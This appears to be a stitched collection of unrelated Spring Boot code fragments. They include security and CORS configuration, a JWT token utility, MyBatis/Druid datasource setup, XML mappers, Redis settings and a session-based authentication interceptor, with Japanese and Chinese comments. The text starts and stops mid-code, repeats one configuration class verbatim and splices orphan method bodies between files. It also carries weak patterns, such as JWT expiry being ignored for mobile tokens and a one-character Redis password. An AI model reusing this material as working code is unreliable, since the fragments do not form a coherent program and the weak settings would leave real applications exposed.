        }

        public static Warns init(String message) {
            return init().add(message);
        }

        public static Warns init(String field, String message) {
            return init().add(field, message);
        }

        public static Warns init(String field, String message, String[] messageArgs) {
            return init().add(field, message, messageArgs);
        }

    }

    /** フィールドスコープの審査例外トークンを表現します。 */
    @Value
    public static class Warn implements Serializable {
        private static final long serialVersionUID = 1L;
        /** 審査例外フィールドキー */
        private String field;
        /** 審査例外メッセージ */
        private String message;
        /** 審査例外メッセージ引数 */
        private String[] messageArgs;

        /** フィールドに従属しないグローバル例外時はtrue */
        public boolean global() {
            return field == null;
        }
    }

    /** 審査例外で用いるメッセージキー定数 */
    public static interface ErrorKeys {
        /** サーバー側で問題が発生した可能性があります */
        String Exception = "error.Exception";
        /** 情報が見つかりませんでした */
        String EntityNotFound = "error.EntityNotFoundException";
        /** ログイン状態が有効ではありません */
        String Authentication = "error.Authentication";
        /** 対象機能の利用が認められていません */
        String AccessDenied = "error.AccessDeniedException";

        /** ログインに失敗しました */
        String Login = "error.login";
        /** 既に登録されているIDです */
        String DuplicateId = "error.duplicateId";

        /** 既に処理済の情報です */
        String ActionUnprocessing = "error.ActionStatusType.unprocessing";
    }

}

import org.springframework.boot.autoconfigure.condition.*;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.*;
import org.springframework.core.annotation.Order;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.web.cors.*;
import org.springframework.web.filter.CorsFilter;

import sample.context.security.*;
import sample.context.security.SecurityConfigurer.*;

/**
 * アプリケーションのセキュリティ定義を表現します。
 */
@Configuration
@EnableConfigurationProperties({ SecurityProperties.class })
public class ApplicationSeucrityConfig {
    
    /** パスワード用のハッシュ(BCrypt)エンコーダー。 */
    @Bean
    PasswordEncoder passwordEncoder() {
        //low: きちんとやるのであれば、strengthやSecureRandom使うなど外部切り出し含めて検討してください
        return new BCryptPasswordEncoder();
    }

    /** CORS全体適用 */
    @Bean
    @ConditionalOnProperty(prefix = "extension.security.cors", name = "enabled", matchIfMissing = false)
    CorsFilter corsFilter(SecurityProperties props) {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(props.cors().isAllowCredentials());
        config.addAllowedOrigin(props.cors().getAllowedOrigin());
        config.addAllowedHeader(props.cors().getAllowedHeader());
        config.addAllowedMethod(props.cors().getAllowedMethod());
        config.setMaxAge(props.cors().getMaxAge());
        source.registerCorsConfiguration(props.cors().getPath(), config);
        return new CorsFilter(source);
    }

    /** Spring Security を用いた API 認証/認可定義を表現します。 */
    @Configuration
    @EnableWebSecurity
    @EnableGlobalMethodSecurity(prePostEnabled = true, proxyTargetClass = true)
    @ConditionalOnProperty(prefix = "extension.security.auth", name = "enabled", matchIfMissing = true)
    @Order(org.springframework.boot.autoconfigure.security.SecurityProperties.ACCESS_OVERRIDE_ORDER)
    static class AuthSecurityConfig {
    
        /** Spring Security 全般の設定 ( 認証/認可 ) を定義します。 */
        @Bean
        @Order(org.springframework.boot.autoconfigure.security.SecurityProperties.ACCESS_OVERRIDE_ORDER)
        SecurityConfigurer securityConfigurer() {
            return new SecurityConfigurer();
        }
        
        /** Spring Security のカスタム認証プロセス管理コンポーネント。 */
        @Bean
        AuthenticationManager authenticationManager() throws Exception {
            return securityConfigurer().authenticationManagerBean();
        }
        
        /** Spring Security のカスタム認証プロバイダ。 */
        @Bean
        SecurityProvider securityProvider() {
            return new SecurityProvider();
        }
        
        /** Spring Security のカスタムエントリポイント。 */
        @Bean
        SecurityEntryPoint securityEntryPoint() {
            return new SecurityEntryPoint();
        }
        
        /** Spring Security におけるログイン/ログアウト時の振る舞いを拡張するHandler。 */
        @Bean
        LoginHandler loginHandler() {
            return new LoginHandler();
        }
        
        /** Spring Security で利用される認証/認可対象となるユーザ情報を提供します。 */
        @Bean
        SecurityActorFinder securityActorFinder() {
            return new SecurityActorFinder();
        }
    }    
}
----------------------------------------------------------------------------------------
import org.aspectj.lang.annotation.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.context.annotation.Configuration;
import org.springframework.stereotype.Component;

import sample.context.actor.*;
import sample.context.actor.Actor.ActorRoleType;
import sample.context.security.SecurityConfigurer;

/**
 * Spring Securityの設定状況に応じてスレッドローカルへ利用者を紐付けるAOPInterceptor。
 */
@Aspect
@Configuration
public class LoginInterceptor {
    
    @Autowired
    private ActorSession session;

    @Before("execution(* *..controller.system.*Controller.*(..))")
    public void bindSystem() {
        session.bind(Actor.System);
    }

    @After("execution(* *..controller..*Controller.*(..))")
    public void unbind() {
        session.unbind();
    }

    /**
     * セキュリティの認証設定(extension.security.auth.enabled)が無効時のみ有効される擬似ログイン処理。
     * <p>開発時のみ利用してください。
     */
    @Aspect
    @Component
    @ConditionalOnMissingBean(SecurityConfigurer.class)
    public static class DummyLoginInterceptor {
        @Autowired
        private ActorSession session;

        @Before("execution(* *..controller.*Controller.*(..))")
        public void bindUser() {
            session.bind(new Actor("sample", ActorRoleType.User));
        }

        @Before("execution(* *..controller.admin.*Controller.*(..))")
        public void bindAdmin() {
            session.bind(new Actor("admin", ActorRoleType.Internal));
        }
    }

}


import java.io.IOException;
import java.net.URLEncoder;
import java.util.*;
import java.util.function.Supplier;

import javax.servlet.http.HttpServletResponse;

import org.apache.commons.io.FilenameUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSource;
import org.springframework.http.*;
import org.springframework.web.multipart.MultipartFile;

import lombok.Setter;
import sample.ValidationException;
import sample.context.ResourceBundleHandler;
import sample.context.Timestamper;
import sample.context.actor.ActorSession;
import sample.context.report.ReportFile;

/**
 * UIコントローラの基底クラス。
 */
@Setter
public class ControllerSupport {

    @Autowired
    private MessageSource msg;
    @Autowired
    private ResourceBundleHandler label;
    @Autowired
    private Timestamper time;
    @Autowired
    private ActorSession session;

    /** i18nメッセージ変換を行います。 */
    protected String msg(String message) {
        return msg(message, session.actor().getLocale());
    }

    protected String msg(String message, final Locale locale) {
        return msg.getMessage(message, new String[0], locale);
    }

    /**
     * リソースファイル([basename].properties)内のキー/値のMap情報を返します。
     * <p>API呼び出し側でi18n対応を行いたい時などに利用してください。
     */
    protected Map<String, String> labels(String basename) {
        return labels(basename, session.actor().getLocale());
    }

    protected Map<String, String> labels(String basename, final Locale locale) {
        return label.labels(basename, locale);
    }

    /** メッセージリソースアクセサを返します。 */
    protected MessageSource msgResource() {
        return msg;
    }

    /** 日時ユーティリティを返します。 */
    protected Timestamper time() {
        return time;
    }

    /**
     * 指定したキー/値をMapに変換します。
     * get等でnullを返す可能性があるときはこのメソッドでMap化してから返すようにしてください。
     * ※nullはJSONバインドされないため、クライアント側でStatusが200にもかかわらず例外扱いされる可能性があります。
     */
    protected <T> Map<String, T> objectToMap(String key, final T t) {
        Map<String, T> ret = new HashMap<>();
        ret.put(key, t);
        return ret;
    }

    protected <T> Map<String, T> objectToMap(final T t) {
        return objectToMap("result", t);
    }

    /** 戻り値を生成して返します。(戻り値がプリミティブまたはnullを許容する時はこちらを利用してください) */
    protected <T> ResponseEntity<T> result(Supplier<T> command) {
        return ResponseEntity.status(HttpStatus.OK).body(command.get());
    }

    protected ResponseEntity<Void> resultEmpty(Runnable command) {
        command.run();
        return ResponseEntity.status(HttpStatus.OK).build();
    }

    /** ファイルアップロード情報(MultipartFile)をReportFileへ変換します。 */
    protected ReportFile uploadFile(final MultipartFile file) {
        return uploadFile(file, (String[]) null);
    }

    /**
     * ファイルアップロード情報(MultipartFile)をReportFileへ変換します。
     * <p>acceptExtensionsに許容するファイル拡張子(小文字統一)を設定してください。
     */
    protected ReportFile uploadFile(final MultipartFile file, final String... acceptExtensions) {
        String fname = StringUtils.lowerCase(file.getOriginalFilename());
        if (acceptExtensions != null && !FilenameUtils.isExtension(fname, acceptExtensions)) {
            throw new ValidationException("file", "アップロードファイルには[{0}]を指定してください",
                    new String[] { StringUtils.join(acceptExtensions) });
        }
        try {
            return new ReportFile(file.getOriginalFilename(), file.getBytes());
        } catch (IOException e) {
            throw new ValidationException("file", "アップロードファイルの解析に失敗しました");
        }
    }

    /**
     * ファイルダウンロード設定を行います。
     * <p>利用する際は戻り値をvoidで定義するようにしてください。
     */
    protected void exportFile(final HttpServletResponse res, final ReportFile file) {
        exportFile(res, file, MediaType.APPLICATION_OCTET_STREAM_VALUE);
    }

    protected void exportFile(final HttpServletResponse res, final ReportFile file, final String contentType) {
        String filename;
        try {
            filename = URLEncoder.encode(file.getName(), "UTF-8").replace("+", "%20");
        } catch (Exception e) {
            throw new ValidationException("ファイル名が不正です");
        }
        res.setContentLength(file.size());
        res.setContentType(contentType);
        res.setHeader("Content-Disposition",
                "attachment; filename=" + filename);
        try {
            IOUtils.write(file.getData(), res.getOutputStream());
        } catch (IOException e) {
            throw new ValidationException("ファイル出力に失敗しました");
        }
    }
}

import org.springframework.boot.autoconfigure.condition.*;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.*;
import org.springframework.core.annotation.Order;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.web.cors.*;
import org.springframework.web.filter.CorsFilter;

import sample.context.security.*;
import sample.context.security.SecurityConfigurer.*;

/**
 * アプリケーションのセキュリティ定義を表現します。
 */
@Configuration
@EnableConfigurationProperties({ SecurityProperties.class })
public class ApplicationSeucrityConfig {
    
    /** パスワード用のハッシュ(BCrypt)エンコーダー。 */
    @Bean
    PasswordEncoder passwordEncoder() {
        //low: きちんとやるのであれば、strengthやSecureRandom使うなど外部切り出し含めて検討してください
        return new BCryptPasswordEncoder();
    }

    /** CORS全体適用 */
    @Bean
    @ConditionalOnProperty(prefix = "extension.security.cors", name = "enabled", matchIfMissing = false)
    CorsFilter corsFilter(SecurityProperties props) {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(props.cors().isAllowCredentials());
        config.addAllowedOrigin(props.cors().getAllowedOrigin());
        config.addAllowedHeader(props.cors().getAllowedHeader());
        config.addAllowedMethod(props.cors().getAllowedMethod());
        config.setMaxAge(props.cors().getMaxAge());
        source.registerCorsConfiguration(props.cors().getPath(), config);
        return new CorsFilter(source);
    }

    /** Spring Security を用いた API 認証/認可定義を表現します。 */
    @Configuration
    @EnableWebSecurity
    @EnableGlobalMethodSecurity(prePostEnabled = true, proxyTargetClass = true)
    @ConditionalOnProperty(prefix = "extension.security.auth", name = "enabled", matchIfMissing = true)
    @Order(org.springframework.boot.autoconfigure.security.SecurityProperties.ACCESS_OVERRIDE_ORDER)
    static class AuthSecurityConfig {
    
        /** Spring Security 全般の設定 ( 認証/認可 ) を定義します。 */
        @Bean
        @Order(org.springframework.boot.autoconfigure.security.SecurityProperties.ACCESS_OVERRIDE_ORDER)
        SecurityConfigurer securityConfigurer() {
            return new SecurityConfigurer();
        }
        
        /** Spring Security のカスタム認証プロセス管理コンポーネント。 */
        @Bean
        AuthenticationManager authenticationManager() throws Exception {
            return securityConfigurer().authenticationManagerBean();
        }
        
        /** Spring Security のカスタム認証プロバイダ。 */
        @Bean
        SecurityProvider securityProvider() {
            return new SecurityProvider();
        }
        
        /** Spring Security のカスタムエントリポイント。 */
        @Bean
        SecurityEntryPoint securityEntryPoint() {
            return new SecurityEntryPoint();
        }
        
        /** Spring Security におけるログイン/ログアウト時の振る舞いを拡張するHandler。 */
        @Bean
        LoginHandler loginHandler() {
            return new LoginHandler();
        }
        
        /** Spring Security で利用される認証/認可対象となるユーザ情報を提供します。 */
        @Bean
        SecurityActorFinder securityActorFinder() {
            return new SecurityActorFinder();
        }
    }    
}
----------------------------------------------------------------------------------------
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mobile.device.Device;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Component;

import java.io.Serializable;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

@Component
public class JwtTokenUtil implements Serializable {

    private static final long serialVersionUID = -3301605591108950415L;

    static final String CLAIM_KEY_USERNAME = "sub";
    static final String CLAIM_KEY_AUDIENCE = "audience";
    static final String CLAIM_KEY_CREATED = "created";

    private static final String AUDIENCE_UNKNOWN = "unknown";
    private static final String AUDIENCE_WEB = "web";
    private static final String AUDIENCE_MOBILE = "mobile";
    private static final String AUDIENCE_TABLET = "tablet";

    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration}")
    private Long expiration;

    public String getUsernameFromToken(String token) {
        String username;
        try {
            final Claims claims = getClaimsFromToken(token);
            username = claims.getSubject();
        } catch (Exception e) {
            username = null;
        }
        return username;
    }

    public Date getCreatedDateFromToken(String token) {
        Date created;
        try {
            final Claims claims = getClaimsFromToken(token);
            created = new Date((Long) claims.get(CLAIM_KEY_CREATED));
        } catch (Exception e) {
            created = null;
        }
        return created;
    }

    public Date getExpirationDateFromToken(String token) {
        Date expiration;
        try {
            final Claims claims = getClaimsFromToken(token);
            expiration = claims.getExpiration();
        } catch (Exception e) {
            expiration = null;
        }
        return expiration;
    }

    public String getAudienceFromToken(String token) {
        String audience;
        try {
            final Claims claims = getClaimsFromToken(token);
            audience = (String) claims.get(CLAIM_KEY_AUDIENCE);
        } catch (Exception e) {
            audience = null;
        }
        return audience;
    }

    private Claims getClaimsFromToken(String token) {
        Claims claims;
        try {
            claims = Jwts.parser()
                    .setSigningKey(secret)
                    .parseClaimsJws(token)
                    .getBody();
        } catch (Exception e) {
            claims = null;
        }
        return claims;
    }

    private Date generateExpirationDate() {
        return new Date(System.currentTimeMillis() + expiration * 1000);
    }

    private Boolean isTokenExpired(String token) {
        final Date expiration = getExpirationDateFromToken(token);
        return expiration.before(new Date());
    }

    private Boolean isCreatedBeforeLastPasswordReset(Date created, Date lastPasswordReset) {
        return (lastPasswordReset != null && created.before(lastPasswordReset));
    }

    private String generateAudience(Device device) {
        String audience = AUDIENCE_UNKNOWN;
        if (device.isNormal()) {
            audience = AUDIENCE_WEB;
        } else if (device.isTablet()) {
            audience = AUDIENCE_TABLET;
        } else if (device.isMobile()) {
            audience = AUDIENCE_MOBILE;
        }
        return audience;
    }

    private Boolean ignoreTokenExpiration(String token) {
        String audience = getAudienceFromToken(token);
        return (AUDIENCE_TABLET.equals(audience) || AUDIENCE_MOBILE.equals(audience));
    }

    public String generateToken(UserDetails userDetails, Device device) {
        Map<String, Object> claims = new HashMap<>();
        claims.put(CLAIM_KEY_USERNAME, userDetails.getUsername());
        claims.put(CLAIM_KEY_AUDIENCE, generateAudience(device));
        claims.put(CLAIM_KEY_CREATED, new Date());
        return generateToken(claims);
    }

    String generateToken(Map<String, Object> claims) {
        return Jwts.builder()
                .setClaims(claims)
                .setExpiration(generateExpirationDate())
                .signWith(SignatureAlgorithm.HS512, secret)
                .compact();
    }

    public Boolean canTokenBeRefreshed(String token, Date lastPasswordReset) {
        final Date created = getCreatedDateFromToken(token);
        return !isCreatedBeforeLastPasswordReset(created, lastPasswordReset)
                && (!isTokenExpired(token) || ignoreTokenExpiration(token));
    }

    public String refreshToken(String token) {
        String refreshedToken;
        try {
            final Claims claims = getClaimsFromToken(token);
            claims.put(CLAIM_KEY_CREATED, new Date());
            refreshedToken = generateToken(claims);
        } catch (Exception e) {
            refreshedToken = null;
        }
        return refreshedToken;
    }

    public Boolean validateToken(String token, UserDetails userDetails) {
        JwtUser user = (JwtUser) userDetails;
        final String username = getUsernameFromToken(token);
        final Date created = getCreatedDateFromToken(token);
        //final Date expiration = getExpirationDateFromToken(token);
        return (
                username.equals(user.getUsername())
                        && !isTokenExpired(token)
                        && !isCreatedBeforeLastPasswordReset(created, user.getLastPasswordResetDate()));
    }
}
----------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;
import org.springframework.boot.orm.jpa.EntityManagerFactoryBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.transaction.PlatformTransactionManager;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;

/**
 * write数据源配置
 *
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-13
 */
@Configuration
@EnableJpaRepositories(value = "com.lc.springBoot.jpa.repository",
        entityManagerFactoryRef = "writeEntityManagerFactory",
        transactionManagerRef = "writeTransactionManager")
public class WriteDataSourceConfig1 {

    @Autowired
    JpaProperties jpaProperties;

    @Autowired
    @Qualifier("writeDruidDataSource")
    private DataSource writeDruidDataSource;

    /**
     * 我们通过LocalContainerEntityManagerFactoryBean来获取EntityManagerFactory实例
     * @return
     */
    @Bean(name = "writeEntityManagerFactoryBean")
    @Primary
    public LocalContainerEntityManagerFactoryBean writeEntityManagerFactoryBean(EntityManagerFactoryBuilder builder) {
        return builder
                .dataSource(writeDruidDataSource)
                .properties(jpaProperties.getProperties())
                .packages("com.lc.springBoot.jpa.entity") //设置实体类所在位置
                .persistenceUnit("writePersistenceUnit")
                .build();
        //.getObject();//不要在这里直接获取EntityManagerFactory
    }

    /**
     * EntityManagerFactory类似于Hibernate的SessionFactory,mybatis的SqlSessionFactory
     * 总之,在执行操作之前,我们总要获取一个EntityManager,这就类似于Hibernate的Session,
     * mybatis的sqlSession.
     * @param builder
     * @return
     */
    @Bean(name = "writeEntityManagerFactory")
    @Primary
    public EntityManagerFactory writeEntityManagerFactory(EntityManagerFactoryBuilder builder) {
        return this.writeEntityManagerFactoryBean(builder).getObject();
    }

    /**
     * 配置事物管理器
     * @return
     */
    @Bean(name = "writeTransactionManager")
    @Primary
    public PlatformTransactionManager writeTransactionManager(EntityManagerFactoryBuilder builder) {
        return new JpaTransactionManager(writeEntityManagerFactory(builder));
    }
}

import com.github.pagehelper.PageHelper;
import org.apache.ibatis.plugin.Interceptor;
import org.apache.ibatis.session.SqlSessionFactory;
import org.mybatis.spring.SqlSessionFactoryBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;

import javax.sql.DataSource;
import java.util.Properties;

/**
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-4
 */
@Configuration//声明这是用来配置的类,用来取代xml配置
public class MybatisConfig {

    /**
     * 注入一个默认数据源
     */
    @Autowired
    private DataSource dataSource;

    /**
     * SqlSessionFactory配置
     *
     * @return
     * @throws Exception
     */
    @Bean
    public SqlSessionFactory sqlSessionFactoryBean() throws Exception {
        SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean();
        sqlSessionFactoryBean.setDataSource(dataSource);

        PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver();
        //配置mapper文件位置
        sqlSessionFactoryBean.setMapperLocations(resolver.getResources("classpath:mapper/*.xml"));

        //配置分页插件
        PageHelper pageHelper = new PageHelper();
        Properties properties = new Properties();
        properties.setProperty("reasonable", "true");
        properties.setProperty("supportMethodsArguments", "true");
        properties.setProperty("returnPageInfo", "check");
        properties.setProperty("params", "count=countSql");
        pageHelper.setProperties(properties);

        //设置插件
        sqlSessionFactoryBean.setPlugins(new Interceptor[]{pageHelper});
        return sqlSessionFactoryBean.getObject();
    }

    /**
     * 配置事物管理器
     *
     * @return
     */
    @Bean
    public DataSourceTransactionManager transactionManager() {
        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();
        dataSourceTransactionManager.setDataSource(dataSource);
        return dataSourceTransactionManager;
    }
}

import org.mybatis.spring.mapper.MapperScannerConfigurer;
import org.springframework.boot.autoconfigure.AutoConfigureAfter;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * 配置mybatis需要扫描的mapper接口
 *
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-4
 */
@Configuration
//MapperScannerConfigurer执行的比较早，所以必须有下面的注解
@AutoConfigureAfter(MybatisConfig.class)
public class MapperScannerConfig {

    @Bean
    public MapperScannerConfigurer mapperScannerConfigurer() {
        MapperScannerConfigurer mapperScannerConfigurer = new MapperScannerConfigurer();
        mapperScannerConfigurer.setBasePackage("com.lc.springBoot.dataSource.mapper");
        return mapperScannerConfigurer;
    }
}

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.lc.springBoot.druid.mapper.master.StudentMapper">

    <insert id="insert" parameterType="com.lc.springBoot.druid.model.Student">
        <selectKey resultType="java.lang.Integer" keyProperty="id" keyColumn="id">
            SELECT LAST_INSERT_ID()
        </selectKey>
        insert into student(name,email,age,birthday) values(#{name},#{email},#{age},#{birthday})
    </insert>

    <select id="getById" resultType="com.lc.springBoot.druid.model.Student">
        select * from student where id = #{id}
    </select>
    <select id="getBypage" resultType="com.lc.springBoot.druid.model.Student">
        SELECT * FROM student
    </select>
</mapper>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.lc.springBoot.druid.mapper.cluster1.TeacherMapper">

    <insert id="insert" parameterType="com.lc.springBoot.druid.model.Teacher">
        <selectKey resultType="java.lang.Integer" keyProperty="id" keyColumn="id">
            SELECT LAST_INSERT_ID()
        </selectKey>
        insert into teacher(name) values(#{name})
    </insert>
</mapper>


        PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver();
        // 配置mapper文件位置
        sqlSessionFactoryBean.setMapperLocations(resolver.getResources(writeMapperLocations));
        return sqlSessionFactoryBean.getObject();
		
import com.alibaba.druid.pool.DruidDataSource;
import com.github.pagehelper.PageHelper;
import org.apache.ibatis.plugin.Interceptor;
import org.apache.ibatis.session.SqlSessionFactory;
import org.mybatis.spring.SqlSessionFactoryBean;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;

import javax.sql.DataSource;
import java.sql.SQLException;
import java.util.Properties;

/**
 * cluster节点数据源配置
 *
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-4
 */
@Configuration
@MapperScan(basePackages = {"com.lc.springBoot.druid.mapper.cluster"},
        sqlSessionFactoryRef = "clusterSqlSessionFactory")
public class ClusterDruidDataSourceConfig {

    @Value("${spring.datasource.cluster.clusterMapperLocations}")
    private String clusterMapperLocations;

    @ConfigurationProperties(prefix = "spring.datasource.cluster")
    @Bean(name = "clusterDataSource")
    public DataSource clusterDataSource() {
        DruidDataSource dataSource = new DruidDataSource();
        try {
            dataSource.setFilters("stat,wall,log4j");
            dataSource.setUseGlobalDataSourceStat(true);
        } catch (SQLException e) {
            //
        }
        return dataSource;
    }

    /**
     * SqlSessionFactory配置
     *
     * @return
     * @throws Exception
     */
    @Bean(name = "clusterSqlSessionFactory")
    public SqlSessionFactory clusterSqlSessionFactory(
            @Qualifier("clusterDataSource") DataSource dataSource
    ) throws Exception {
        SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean();
        sqlSessionFactoryBean.setDataSource(dataSource);

        PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver();
        //配置mapper文件位置
        sqlSessionFactoryBean.setMapperLocations(resolver.getResources(clusterMapperLocations));

        //配置分页插件
        PageHelper pageHelper = new PageHelper();
        Properties properties = new Properties();
        properties.setProperty("reasonable", "true");
        properties.setProperty("supportMethodsArguments", "true");
        properties.setProperty("returnPageInfo", "check");
        properties.setProperty("params", "count=countSql");
        pageHelper.setProperties(properties);

        //设置插件
        sqlSessionFactoryBean.setPlugins(new Interceptor[]{pageHelper});
        return sqlSessionFactoryBean.getObject();
    }

    /**
     * 配置事物管理器
     *
     * @return
     */
    @Bean(name = "clusterTransactionManager")
    public DataSourceTransactionManager clusterTransactionManager(
            @Qualifier("clusterDataSource") DataSource dataSource
    ) {
        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();
        dataSourceTransactionManager.setDataSource(dataSource);
        return dataSourceTransactionManager;
    }
}

import com.alibaba.druid.support.http.WebStatFilter;

import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebInitParam;

/**
 * 配置过滤器,需要拦截哪些url,忽略哪些url,初始化参数等
 *
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-7
 */
@WebFilter(filterName = "druidStatFilter",//过滤器名称
        urlPatterns = "/",//需要拦截的url
        initParams = {//filter初始化信息
                //需要忽略的资源
                @WebInitParam(name = "exclusions", value = "*.js,*.gif,*.jpg," +
                        "*.bmp,*.png,*.css,*.ico,/dataSource/*"),
                @WebInitParam(name = "sessionStatEnable", value = "true"),
                @WebInitParam(name = "profileEnable", value = "true")})
public class DruidStatFilter extends WebStatFilter {
}

import com.alibaba.druid.support.spring.stat.DruidStatInterceptor;
import org.springframework.aop.Advisor;
import org.springframework.aop.support.DefaultPointcutAdvisor;
import org.springframework.aop.support.JdkRegexpMethodPointcut;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * 配置Spring监控
 * @author lsj <lishuijun1992@gmail.com>
 * @date 17-4-8
 */
@Configuration
public class MyDruidStatInterceptor {

    private static final String[] patterns = new String[]{"com.lc.springBoot.dataSource.service.*"};

    @Bean
    public DruidStatInterceptor druidStatInterceptor() {
        return new DruidStatInterceptor();
    }

    /**
     * 切入点
     * @return
     */
    @Bean
    public JdkRegexpMethodPointcut druidStatPointcut() {
        JdkRegexpMethodPointcut druidStatPointcut = new JdkRegexpMethodPointcut();
        druidStatPointcut.setPatterns(patterns);
        return druidStatPointcut;
    }

    /**
     * 配置aop
     * @return
     */
    @Bean
    public Advisor druidStatAdvisor() {
        return new DefaultPointcutAdvisor(druidStatPointcut(), druidStatInterceptor());
    }
}


# REDIS (RedisProperties)
#spring.redis.cluster.max-redirects= # Maximum number of redirects to follow when executing commands across the cluster.
#spring.redis.cluster.nodes= # Comma-separated list of "host:port" pairs to bootstrap from.
#spring.redis.database=0 # Database index used by the connection factory.
spring.redis.host=127.0.0.1
spring.redis.password=1
spring.redis.pool.max-active=8
spring.redis.pool.max-idle=8
spring.redis.pool.max-wait=-1
spring.redis.pool.min-idle=0
spring.redis.port=6379
#spring.redis.sentinel.master= # Name of Redis server.
#spring.redis.sentinel.nodes= # Comma-separated list of host:port pairs.
#spring.redis.timeout=0 # Connection timeout in milliseconds.
----------------------------------------------------------------------------------------
import org.launchcode.springfilterbasedauth.controllers.AbstractController;
import org.launchcode.springfilterbasedauth.models.User;
import org.launchcode.springfilterbasedauth.models.dao.UserDao;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;

/**
 * Created by LaunchCode
 */
public class AuthenticationInterceptor extends HandlerInterceptorAdapter {

    @Autowired
    UserDao userDao;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws IOException {

        // Authentication white list; add all publicly visible pages here
        List<String> nonAuthPages = Arrays.asList("/login", "/register");

        // Require sign-in for auth pages
        if ( !nonAuthPages.contains(request.getRequestURI()) ) {

            Integer userId = (Integer) request.getSession().getAttribute(AbstractController.userSessionKey);

            if (userId != null) {
                User user = userDao.findOne(userId);

                if (user != null)
                    return true;
            }

            response.sendRedirect("/login");
            return false;
        }

        return true;
    }

}

    @Bean
    public RedisTemplate<String, Object> redisTemplate() {
        final RedisTemplate<String, Object> template = new RedisTemplate<String, Object>();
        template.setConnectionFactory(jedisConnectionFactory());
        template.setValueSerializer(new GenericToStringSerializer<Object>(Object.class));
        return template;
    }

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import static org.springframework.hateoas.mvc.ControllerLinkBuilder.linkTo;
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.methodOn;

@RestController
@RequestMapping("/api/v1/clients")
public class BootmonClientController {

    @Autowired
    BootmonClientService bootmonClientService;

    @PostMapping
